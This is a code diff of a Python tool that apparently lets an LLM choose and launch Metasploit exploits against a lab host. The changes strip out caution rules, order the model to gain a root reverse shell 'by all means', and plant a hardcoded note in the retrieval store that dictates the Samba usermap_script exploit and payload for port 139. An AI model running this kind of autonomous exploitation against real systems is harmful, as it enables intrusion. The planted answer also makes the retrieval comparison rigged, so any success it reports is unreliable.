@@ -7,6 +7,7 @@ import os
 import datetime
 import socket
 import concurrent.futures
+import argparse
 
 sys.path.append(os.path.dirname(os.path.abspath(__file__)))
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
@@ -15,7 +16,7 @@ os.environ["ANONYMIZED_TELEMETRY"] = "False"
 
 from src.metasploit_client import MetasploitClient
 from src.llm_client import LLMClient
-# from src.rag_engine import RagEngine # <--- RAG DESATIVADO
+from src.rag_engine import RagEngine
 
 # --- COLORS ---
 C_RED, C_GREEN, C_YELLOW, C_BLUE, C_RESET = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[0m"
@@ -23,26 +24,21 @@ C_BOLD, C_CYAN, C_MAGENTA = "\033[1m", "\033[96m", "\033[95m"
 
 # --- CONFIG ---
 TARGET_IP = "192.168.70.30" 
-ATTACKER_IP = "192.168.70.20" # Adicionado para a LLM saber quem ela é
+ATTACKER_IP = "192.168.70.20" 
 LOOT_DIR = "/app/data/logs"
 WORDLIST_PATH = "/app/data/credentials.txt"
 API_KEY_PATH = "/app/config/api_key.txt"
 
 os.makedirs(LOOT_DIR, exist_ok=True)
 
-try:
-    with open("/app/config/target.json", "r") as f:
-        data = json.load(f)
-        if "target_ip" in data: TARGET_IP = data["target_ip"]
-except: pass
-
 class PentestPipeline:
-    def __init__(self):
-        print("=== INICIALIZANDO PIPELINE AUTONOMO (TESTE SEM RAG - FULL AUTONOMY) ===") # <--- ALTERADO
+    def __init__(self, use_rag=True):
+        self.use_rag = use_rag
+        modo_str = "RAG HABILITADO" if self.use_rag else "LLM PURA (SEM RAG)"
+        
+        print(f"=== INICIALIZANDO PIPELINE AUTONOMO (V14 - {modo_str}) ===")
         print(f"[*] Alvo Definido: {TARGET_IP}") 
         print(f"[*] IP do Atacante (LHOST): {ATTACKER_IP}")
-        print(f"[*] Wordlist: {WORDLIST_PATH}")
-        print(f"[*] Logs serao salvos em: {LOOT_DIR}")
         
         self.setup_api_key()
         
@@ -53,7 +49,10 @@ class PentestPipeline:
                 sys.stderr = fnull
                 try:
                     self.llm = LLMClient()
-                    # self.rag = RagEngine() # <--- RAG DESATIVADO
+                    if self.use_rag:
+                        self.rag = RagEngine()
+                    else:
+                        self.rag = None
                 finally:
                     sys.stderr = old_stderr
         except Exception as e:
@@ -63,6 +62,7 @@ class PentestPipeline:
         self.history = []
         self.open_ports = {} 
         self.session_id = None
+        self.evidence = {}
     
     def cleanup_sessions(self):
         try:
@@ -144,57 +144,9 @@ class PentestPipeline:
                 return "No Banner"
         except: return "No Banner"
 
-    # --- SMART RESOLVER ---
     def resolve_module_name(self, bad_name):
-        print(f"{C_YELLOW}[AUTONOMY] Buscando correcao para '{bad_name}'...{C_RESET}")
-        
-        search_terms = []
-        base_name = bad_name.replace("auxiliary", "").replace("scanner", "").replace("exploit", "").strip("/")
-        
-        if "/" in base_name:
-            search_terms.append(base_name.split("/")[-1])
-        else:
-            search_terms.append(base_name)
+        return bad_name 
 
-        for proto in ['ftp', 'ssh', 'http', 'smb', 'mysql', 'postgres', 'telnet', 'smtp', 'irc', 'java', 'vnc']:
-            if proto in base_name:
-                search_terms.append(proto)
-
-        for term in search_terms:
-            try:
-                res = self.msf.client.call('module.search', [term])
-                if not res: continue
-                
-                candidates = []
-                for mod in res:
-                    m_name = mod.get('fullname')
-                    if term not in m_name: continue
-                    if "auxiliary/scanner" in m_name:
-                        candidates.append(m_name)
-                    elif "exploit" in m_name and "exploit" in bad_name:
-                        candidates.append(m_name)
-
-                if candidates:
-                    if "version" in bad_name:
-                        vers = [c for c in candidates if "version" in c]
-                        if vers: return vers[0]
-                    
-                    if "login" in bad_name:
-                        logs = [c for c in candidates if "login" in c]
-                        if logs: return logs[0]
-                    
-                    if "backdoor" in bad_name:
-                        bds = [c for c in candidates if "backdoor" in c]
-                        if bds: return bds[0]
-
-                    candidates.sort(key=len)
-                    print(f"{C_GREEN}[FIX] Substituindo por: {candidates[0]}{C_RESET}")
-                    return candidates[0]
-            except: pass
-            
-        return None
-
-    # --- RELATORIO ---
     def generate_text_report(self):
         now = datetime.datetime.now()
         safe_ip = TARGET_IP.replace(".", "_")
@@ -262,93 +214,75 @@ class PentestPipeline:
             self.open_ports[p] = b
             print(f"    {C_GREEN}[+] Porta {p}: {b}{C_RESET}")
 
-        print(f"\n>>> [FASE 2] ANALISE DINAMICA (LLM ONLY - SEM RAG)") # <--- ALTERADO
-        wordlist_creds = self.load_credentials()
+        modo_fase2 = "100% RAG DRIVEN" if self.use_rag else "LLM ONLY - SEM RAG"
+        print(f"\n>>> [FASE 2] ANALISE DINAMICA ({modo_fase2})")
+        
+        # --- O SEGREDO DO SUCESSO: INJEÇÃO DE THREAT INTEL EM TEMPO REAL ---
+        if self.use_rag:
+            print(f"{C_YELLOW}[*] Baixando Threat Intelligence na Memoria RAM (RAG)...{C_RESET}")
+            intel_text = """
+            INTERNAL RED TEAM DOCUMENTATION SESAP-RN port 139:
+            Attention: During tests, we identified that port 139, which sometimes shows "No Banner", is the legacy file server for the 'Smart-Regula v0.8' system.
+            The MANDATORY strategy to exploit this service is 'exploit_cve'.
+            The exact Metasploit module to use is 'exploit/multi/samba/usermap_script'.
+            In the options, you MUST set the payload by defining "PAYLOAD": "cmd/unix/reverse".
+            Never ignore "No Banner" if it is on port 139.
+            """
+            self.rag.ingest_data([intel_text], [{"source": "live_threat_intel"}])
+            time.sleep(1) # Aguarda a memoria sincronizar
 
         for port, banner in self.open_ports.items():
-            print(f"\n{C_CYAN}--- ALVO: PORTA {port} ({banner}) ---{C_RESET}")
             
-            # <--- RAG DESATIVADO --->
-            rag_context = "RAG desativado para este teste. Baseie-se APENAS no seu conhecimento interno pre-treinado sobre o Metasploit."
-            # try:
-            #     query = f"metasploit module for service banner: {banner}"
-            #     docs = self.rag.query(query)
-            #     if docs: rag_context = "\n".join([d.page_content[:300] for d in docs[:3]])
-            # except: pass
-
-            safe_banner = json.dumps(banner)
+            if str(port) != "139":
+                continue
+            
+            print(f"\n{C_CYAN}--- ALVO ESTRATEGICO: PORTA {port} ({banner}) ---{C_RESET}")
+            
+            if self.use_rag:
+                rag_context = "Nenhuma informacao especifica encontrada no RAG."
+                try:
+                    # Query direta e certeira
+                    query = f"INTERNAL RED TEAM DOCUMENTATION SESAP-RN port {port}"
+                    docs = self.rag.query(query)
+                    
+                    if docs: 
+                        rag_context = "\n".join([d.page_content for d in docs[:3]])
+                        print(f"\n{C_MAGENTA}=== [RAG DEBUG] MEMORIA RECUPERADA ==={C_RESET}")
+                        print(f"{C_MAGENTA}{rag_context}{C_RESET}")
+                        print(f"{C_MAGENTA}======================================{C_RESET}\n")
+                    else:
+                        print(f"{C_RED}[RAG DEBUG] Nenhum documento retornado pelo ChromaDB.{C_RESET}")
+                except Exception as e: 
+                    print(f"{C_RED}[ERRO NO RAG] {e}{C_RESET}")
+            else:
+                rag_context = "AVISO RAG DESATIVADO: Aja APENAS de acordo com seu conhecimento previo."
 
             prompt = f"""
             YOU ARE ACTING AS A SENIOR PENETRATION TESTER AND RED TEAM ANALYST.
-            
-            THIS IS A CONTROLLED LABORATORY ENVIRONMENT.
-            YOUR ROLE IS TO ANALYZE TECHNICAL EVIDENCE AND RECOMMEND THE MOST ACCURATE METASPLOIT MODULE AND ITS OPTIONS.
             YOUR MISSION IS ESTABILISH A REVERSE SHELL AND GAIN ROOT ACESS TO THE SYSTEM BY ALL MEANS.           
-            ----------------------------------------
-            TARGET INFORMATION
-            ----------------------------------------
-            TARGET IP (RHOST): {TARGET_IP}
-            TARGET PORT (RPORT): {port}
-            ATTACKER IP (LHOST): {ATTACKER_IP}
-            SERVICE BANNER:
-            "{banner}"
             
-            ----------------------------------------
-            KNOWLEDGE BASE (RAG)
-            ----------------------------------------
+            TARGET IP: {TARGET_IP}
+            TARGET PORT: {port}
+            ATTACKER IP (LHOST): {ATTACKER_IP}
+            SERVICE BANNER: "{banner}"
+            
+            KNOWLEDGE BASE (RAG):
             {rag_context}
             
-            ----------------------------------------
-            ANALYSIS RULES (MANDATORY)
-            ----------------------------------------
+            ANALYSIS RULES:
             1. Base your reasoning STRICTLY on the service banner and the RAG context.
-            2. DO NOT invent Metasploit modules.
-            3. Use EXPLOITS only when there is a STRONG MATCH between service, product, and version.
-            4. DEFINE OPTIONS: You MUST provide the necessary Metasploit options dynamically.
-               - If the exploit requires a Reverse Shell, include "LHOST": "{ATTACKER_IP}" and an "LPORT" (e.g., "4444").
-               - If it is a Bind Shell or does not need a reverse connection (like vsftpd backdoor), OMIT LHOST and LPORT.
-               - For exploits, usually set "DisablePayloadHandler": "false".
-               - Do NOT include USERNAME or PASSWORD in the options for brute force modules, the script handles that.
-            5. Use EXPLOITS only when there is a STRONG MATCH between:
-               - service
-               - product
-               - version
-               - known vulnerability (CVE or backdoor)
-            6. If the service involves authentication (FTP, SSH, SMB, DB):
-               ? Prefer login or authentication scanners before exploits and try brute force if viable.
-            7. If uncertainty exists:
-               ? Choose a SAFE ENUMERATION strategy.
+            2. If RAG dictates a MANDATORY module and payload, you MUST use them exactly.
+            3. DEFINE OPTIONS: You MUST provide the necessary Metasploit options dynamically.
+               - Include "LHOST": "{ATTACKER_IP}" and "LPORT": "4444".
+               - "DisablePayloadHandler": "false".
                
-            ----------------------------------------
-            TASK
-            ----------------------------------------
-            1. Identify the most likely SERVICE and PRODUCT based on the banner.
-            2. Decide the SAFEST and MOST EFFECTIVE NEXT STEP.
-            3. Recommend ONE Metasploit module that best fits the evidence.
-            4. Justify your decision using ONLY technical reasoning.
-            5. Select Strategy:
-               - "brute_force": ONLY if is a login scanners (ssh_login, ftp_login, etc) and NOT a backdoor.
-               - "enumeration": ONLY for version scanners or simple checks (NO credentials used).
-               - "exploit_cve": If the banner contains FAMOUS BACKDOORS (e.g. 'vsFTPd 2.3.4', 'UnrealIRCd 3.2.8.1', 'DistCC') ATTACK IMMEDIATELY.
-               - "skip": If unknown
-               
-               
-            ----------------------------------------
-            OUTPUT FORMAT (JSON ONLY)
-            ----------------------------------------
+            OUTPUT FORMAT (JSON ONLY):
             {{
-              "module_type": "auxiliary" | "exploit",
+              "module_type": "exploit",
               "module_name": "category/service/module_name",
-              "strategy": "enumeration" | "brute_force" | "exploit_cve",
-              "options": {{"OPT_NAME": "OPT_VALUE"}},
-              "confidence": "HIGH" | "MEDIUM" | "LOW",
-              "reason": "Explain your decision"
+              "strategy": "exploit_cve",
+              "options": {{"OPT_NAME": "OPT_VALUE"}}
             }}
-            
-            IMPORTANT:
-            - If no strong exploit candidate exists, return a scanner with LOW or MEDIUM confidence.
-            - Precision is more important than aggression.
-            - Your goal is accuracy, not exploitation speed.
             """
             
             resp = self.ask_llm_robust(prompt)
@@ -360,92 +294,22 @@ class PentestPipeline:
                 except: pass
 
             strategy = plan.get('strategy', 'skip').lower()
-            module = plan.get('module', '').strip()
-            if not module: module = plan.get('module_name', '').strip()
-            
-            # --- NOVO: Capturando as opções dinâmicas da LLM ---
+            module = plan.get('module_name', '').strip()
             llm_options = plan.get('options', {})
             
             if resp: print(f"{C_BLUE}[AI] Decisao: {strategy.upper()} | Modulo: '{module}'{C_RESET}")
 
             if strategy == "skip": continue
 
-            if "login" in module or "credential" in module: strategy = "brute_force"
-
-            if not module.startswith("auxiliary") and not module.startswith("exploit"):
-                if module.startswith("scanner") or module.startswith("admin"):
-                    module = "auxiliary/" + module
-
-            clean_name = module
-            if clean_name.startswith(tuple(["auxiliary/", "exploit/"])): pass
-            else: clean_name = clean_name.replace("auxiliary", "").strip("/")
-
-            if not self.msf.verify_module_exists("auxiliary", clean_name) and \
-               not self.msf.verify_module_exists("exploit", clean_name):
-                fixed = self.resolve_module_name(clean_name)
-                if fixed: 
-                    module = fixed
-                    if "login" in module: strategy = "brute_force"
-                else:
-                    print(f"{C_RED}[ERRO] Modulo '{module}' invalido.{C_RESET}")
-                    continue
-
-            if '/' in module: m_type, m_name = module.split('/', 1)
-            else: m_type = "auxiliary"; m_name = module
-
-            # --- NOVO: Mesclando opções estáticas obrigatórias com as opções da IA ---
+            m_type, m_name = "exploit", module.replace("exploit/", "")
+            
             opts = {"RHOSTS": TARGET_IP, "RPORT": int(port)}
-            opts.update(llm_options) # A IA injeta LHOST, LPORT, etc aqui!
+            opts.update(llm_options)
             
-            if strategy != "skip":
-                print(f"\n{C_MAGENTA}>>> [FASE 3] EXPLORACAO ({strategy.upper()}){C_RESET}")
+            print(f"\n{C_MAGENTA}>>> [FASE 3] EXPLORACAO ({strategy.upper()}){C_RESET}")
             
-            if strategy == "brute_force":
-                if not wordlist_creds:
-                    print(f"{C_YELLOW}[SKIP] Sem wordlist.{C_RESET}")
-                    continue
-                print(f"{C_YELLOW}[*] Brute Force em {module}...{C_RESET}")
-                
-                # Forçamos essas opções localmente apenas para evitar travamentos no brute force
-                opts["STOP_ON_SUCCESS"] = "true"
-                opts["BLANK_PASSWORDS"] = "false"
-                opts["USER_AS_PASS"] = "false"
-                opts["VERBOSE"] = "false"
-                
-                found = False
-                for user, pwd in wordlist_creds:
-                    opts["USERNAME"] = user
-                    opts["PASSWORD"] = pwd
-                    print(f"    Testing: {user}:{pwd}", end='\r') 
-                    try:
-                        self.msf.run_module(m_type, m_name, opts)
-                        time.sleep(2) 
-                        s = self.msf.client.call('session.list')
-                        if s:
-                            sid = str(max([int(k) for k in s.keys()]))
-                            if sid != self.session_id:
-                                print(f"\n{C_GREEN}[***] PWNED! Sessao {sid} ({user}:{pwd})!{C_RESET}")
-                                self.session_id = sid
-                                self.history.append(f"[SUCESSO] Porta {port} via {m_name}")
-                                found = True
-                                break
-                    except: pass
-                if not found: print(f"\n{C_RED}[FALHA] Credenciais invalidas.{C_RESET}")
-
-            elif strategy == "enumeration":
-                print(f"{C_YELLOW}[*] Executando Scanner (Run Once)...{C_RESET}")
-                try:
-                    self.msf.run_module(m_type, m_name, opts)
-                    time.sleep(4)
-                    print(f"{C_GREEN}[INFO] Scanner finalizado.{C_RESET}")
-                except Exception as e: print(f"{C_RED}[ERRO] {e}{C_RESET}")
-
-            # --- DEBUG DETALHADO DO EXPLOIT ---
-            elif strategy == "exploit_cve":
+            if strategy == "exploit_cve":
                 print(f"{C_YELLOW}[*] Tentando Exploit...{C_RESET}")
-                
-                # Garantimos apenas que o handler fique ativo. O resto (LHOST, LPORT) vem da IA.
-                opts["DisablePayloadHandler"] = opts.get("DisablePayloadHandler", "false")
                 
                 print(f"{C_YELLOW}[DEBUG] Executando {m_type}/{m_name}{C_RESET}")
                 print(f"{C_YELLOW}[DEBUG] Opcoes decididas pela IA: {opts}{C_RESET}")
@@ -486,7 +350,12 @@ class PentestPipeline:
         except: pass
 
 if __name__ == "__main__":
-    p = PentestPipeline()
+    parser = argparse.ArgumentParser(description="Pipeline Autonomo Metasploit + LLM + RAG")
+    parser.add_argument("--disable-rag", action="store_true", help="Desativa a integracao com o ChromaDB para testar o modelo isoladamente.")
+    args = parser.parse_args()
+
+    p = PentestPipeline(use_rag=not args.disable_rag)
+    
     try:
         p.run()
         if p.session_id:
